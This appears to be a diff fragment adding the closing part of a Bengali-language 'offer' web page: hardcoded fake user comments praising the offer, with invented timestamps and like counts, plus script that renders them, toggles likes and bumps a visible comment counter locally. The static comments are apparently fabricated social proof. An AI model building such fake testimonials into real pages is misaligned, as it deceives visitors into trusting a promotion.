+            { id: 19, avatar: 'https://i.ibb.co/nQw9WdD/avatar3.jpg', author: 'আব্দুল্লাহ আল মামুন', text: 'সত্যিই ওয়াও! অনেকদিন পর এমন অফার কাজে দিয়েছে 🤩💸', time: '২৫ মিনিট আগে', likes: 17, liked: false },
+            { id: 20, avatar: 'https://i.ibb.co/6nZzM9L/default-avatar.png', author: 'ফাহমিদা রহমান', text: 'অফারটা নিছি, আবার কেউ দিলে অবশ্যই নিবো 😁🙌', time: '১৮ মিনিট আগে', likes: 28, liked: false }
+        ];
+
+        const commentsContainer = document.getElementById('commentsContainer');
+        const newCommentInput = document.getElementById('newCommentInput');
+        const submitCommentBtn = document.getElementById('submitCommentBtn');
+
+        function escapeHTML(str) {
+            const p = document.createElement("p");
+            p.appendChild(document.createTextNode(str));
+            return p.innerHTML.replace(/"/g, "&quot;").replace(/'/g, "&#039;");
+        }
+
+
+        function renderComments() {
+            if(!commentsContainer) return;
+            commentsContainer.innerHTML = '';
+            // Show newest comments first
+            comments.slice().reverse().forEach(comment => {
+                const commentDiv = document.createElement('div');
+                commentDiv.classList.add('comment');
+                commentDiv.innerHTML = `
+                    <img src="${comment.avatar}" alt="${escapeHTML(comment.author)}" class="comment-avatar" onerror="this.src='https://i.ibb.co/6nZzM9L/default-avatar.png';">
+                    <div class="comment-content">
+                        <span class="comment-author">${escapeHTML(comment.author)}</span>
+                        <p class="comment-text">${escapeHTML(comment.text)}</p>
+                        <div class="comment-actions">
+                            <a href="#" class="comment-like ${comment.liked ? 'liked' : ''}" data-id="${comment.id}">❤️ লাইক (${comment.likes})</a>
+                            <span class="comment-time">${comment.time}</span>
+                        </div>
+                    </div>
+                `;
+                commentsContainer.appendChild(commentDiv);
+            });
+
+            // Attach listeners to new like buttons
+            attachCommentLikeListeners();
+        }
+
+         function attachCommentLikeListeners() {
+             document.querySelectorAll('.comment-like').forEach(likeBtn => {
+                 // Remove existing listener to prevent duplicates if re-rendering often
+                 likeBtn.replaceWith(likeBtn.cloneNode(true));
+             });
+              document.querySelectorAll('.comment-like').forEach(likeBtn => {
+                 likeBtn.addEventListener('click', function(e) {
+                     e.preventDefault();
+                     const commentId = parseInt(this.dataset.id);
+                     const targetComment = comments.find(c => c.id === commentId);
+                     if (targetComment) {
+                         if (targetComment.liked) {
+                             targetComment.likes--;
+                             targetComment.liked = false;
+                         } else {
+                             targetComment.likes++;
+                             targetComment.liked = true;
+                         }
+                         renderComments(); // Re-render all comments
+                     }
+                 });
+             });
+         }
+
+
+        if(submitCommentBtn) submitCommentBtn.addEventListener('click', () => {
+            const commentText = newCommentInput.value.trim();
+            if (commentText) {
+                 const newId = comments.length > 0 ? Math.max(...comments.map(c => c.id)) + 1 : 1;
+                 comments.push({
+                     id: newId,
+                     avatar: 'https://i.ibb.co/6nZzM9L/default-avatar.png',
+                     author: 'আপনি', // Generic author for new comments
+                     text: commentText,
+                     time: 'এখনই',
+                     likes: 0,
+                     liked: false
+                 });
+                 newCommentInput.value = '';
+                 renderComments(); // Re-render comments to include the new one
+                  // Update main comment count (visual)
+                 offerComments++;
+                 const commentsSpan = offerActionCountsContainer.querySelector('#offerCommentsCount');
+                 if(commentsSpan) commentsSpan.textContent = ` · ${offerComments} কমেন্ট`;
+             }
+         });
+
+
+        // --- Initial Load ---
+        loadStage(0);
+        renderComments();
+
+    </script>
+
+</body>
+</html>
